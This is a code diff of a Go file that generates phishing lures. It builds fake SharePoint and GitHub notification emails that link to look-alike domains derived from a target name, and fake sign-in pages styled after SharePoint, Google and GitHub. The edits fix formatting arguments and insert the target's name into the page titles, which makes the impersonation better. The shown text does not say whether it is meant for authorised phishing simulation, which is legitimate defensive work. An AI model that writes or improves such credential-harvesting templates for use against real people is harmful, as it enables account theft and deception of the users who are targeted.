@@ -360,7 +360,7 @@ func sharepointEmailHTML(target string) string {
 	return fmt.Sprintf(`<html><body><p>SharePoint Notification</p>
 <p>John Smith shared a document with you: "Q4_Financial_Report.xlsx"</p>
 <p><a href="https://sharepoint-%s/preview">View Document</a></p>
-<p>This link will expire in 7 days.</p></body></html>`, target, target)
+<p>This link will expire in 7 days.</p></body></html>`, target)
 }
 
 func googleEmailHTML(target string) string {
@@ -374,7 +374,7 @@ func githubEmailHTML(target string) string {
 	return fmt.Sprintf(`<html><body><p>GitHub Security</p>
 <p>New sign-in to your GitHub account from an unrecognized device.</p>
 <p><a href="https://github-%s/sessions">View Sessions</a></p>
-<p>If this wasn't you, please review your security settings.</p></body></html>`, target, target)
+<p>If this wasn't you, please review your security settings.</p></body></html>`, target)
 }
 
 func slackEmailHTML(target string) string {
@@ -449,7 +449,7 @@ button{width:100%%;padding:12px;background:#0078d4;color:white;border:none;borde
 }
 
 func sharepointPageHTML(target string) string {
-	return fmt.Sprintf(`<!DOCTYPE html><html><head><title>SharePoint - Document Access</title>
+	return fmt.Sprintf(`<!DOCTYPE html><html><head><title>%s - Document Access</title>
 <style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#0078d4}
 .sp-box{background:white;padding:40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:400px}
 input{width:100%%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ddd;border-radius:4px}
@@ -464,7 +464,7 @@ button{width:100%%;padding:12px;background:#0078d4;color:white;border:none;borde
 }
 
 func googlePageHTML(target string) string {
-	return fmt.Sprintf(`<!DOCTYPE html><html><head><title>Google - Sign In</title>
+	return fmt.Sprintf(`<!DOCTYPE html><html><head><title>%s - Sign In</title>
 <style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#f5f5f5}
 .google-box{background:white;padding:48px 40px;border-radius:8px;box-shadow:0 2px 10px rgba(0,0,0,0.1);width:380px}
 input{width:100%%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #ddd;border-radius:4px}
@@ -482,7 +482,7 @@ button{width:100%%;padding:12px;background:#1a73e8;color:white;border:none;borde
 }
 
 func githubPageHTML(target string) string {
-	return fmt.Sprintf(`<!DOCTYPE html><html><head><title>GitHub - Sign in</title>
+	return fmt.Sprintf(`<!DOCTYPE html><html><head><title>%s - Sign in</title>
 <style>body{font-family:sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;margin:0;background:#0d1117}
 .gh-box{background:white;padding:40px;border-radius:6px;box-shadow:0 2px 10px rgba(0,0,0,0.3);width:340px}
 input{width:100%%;padding:12px;margin:8px 0;box-sizing:border-box;border:1px solid #d0d7de;border-radius:6px}
